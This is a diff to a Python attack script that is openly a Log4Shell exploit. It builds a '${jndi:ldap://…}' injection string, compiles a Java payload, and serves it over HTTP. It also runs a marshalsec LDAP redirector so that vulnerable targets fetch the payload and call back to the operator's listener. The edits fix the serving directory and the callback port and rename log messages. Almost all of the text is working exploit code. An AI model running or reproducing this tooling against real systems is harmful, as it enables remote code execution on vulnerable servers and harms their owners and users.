@@ -1,5 +1,6 @@
 import threading
 import subprocess
+from functools import partial
 import sys
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from pwn import *
@@ -21,7 +22,7 @@ try:
 	webport = sys.argv[2]
 	lport = lsocket.split(":",1)[1]
 	lip = lsocket.split(":",1)[0]
-	log.info("Exploit payload calling back to: "+lip+":"+lport)
+	log.info("Exploit Exploit calling back to: "+lip+":"+lport)
 	log.info("HTTP Listener on : "+webport)
 except:
 	log.info("Duh, your not using me right....")
@@ -48,7 +49,7 @@ def make_payload():
 	payload_orig.close()
 	copy.close()
 
-	#compile payload
+	#compile Exploit
 	try:
 		subprocess.run([javac_path, payload_path])
 		log.info("Payload created")
@@ -58,16 +59,16 @@ def make_payload():
 
 def HTTPSvr():
     log.info("Starting Webserver on port %s  http://0.0.0.0:%s"%(webport,webport))
-    httpd = HTTPServer(('0.0.0.0', int(webport)), SimpleHTTPRequestHandler)
+    handler = partial(SimpleHTTPRequestHandler, directory="share")
+    httpd = HTTPServer(('0.0.0.0', int(webport)), handler)
     httpd.serve_forever()
 
 def LDAPSvr():
 	exploit = "${jndi:ldap://%s:1389/a}"%(lip)
 	log.info("*****EXPLOIT****")
 	print("\n\n"+exploit+"\n\n")
-	url = ("http://%s:%s/#payload")%(lip,lport)
-	log.info(url)
-	p = subprocess.run([java_path,"-cp",marshal_path,marshal_bin,url])
+	url = ("http://%s:%s/#payload")%(lip,webport)
+	subprocess.run([java_path,"-cp",marshal_path,marshal_bin,url,])
 
 
 
@@ -76,8 +77,7 @@ def main():
 	tLDAP = threading.Thread(target=LDAPSvr,args=())
 	tLDAP.start()
 	HTTPSvr()
-
-
+	
 
 
 if "__main__" in __name__:
